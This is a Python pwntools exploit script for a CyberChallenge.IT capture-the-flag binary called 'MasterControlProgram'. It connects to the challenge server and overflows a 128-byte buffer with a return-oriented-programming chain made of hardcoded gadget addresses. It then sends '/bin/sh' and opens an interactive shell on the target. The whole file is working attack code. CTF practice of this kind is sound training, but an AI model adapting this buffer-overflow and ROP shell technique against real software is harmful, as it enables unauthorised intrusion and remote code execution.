from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Jeopardy/MasterControlProgram/mcp")
context.binary = exe
p = remote('mcp.challs.cyberchallenge.it', 6023)
print("[+] Exploiting...")
POP_RSI = 0x0400159
STRING = 0x060016c
READ = 0x0400138
POP_R10 = 0x0400153
EXIT = 0x040015b
chain = (
        b'A' * 128 +
        p64(POP_RSI) +  # pop rsi
        p64(STRING) +   # string
        p64(READ) +     # read
        p64(POP_R10) +  # pop r10 ....
        p64(STRING) +   # string
        p64(EXIT)       # exit
)

p.sendline(chain)
p.sendline('/bin/sh\x00')
p.interactive()
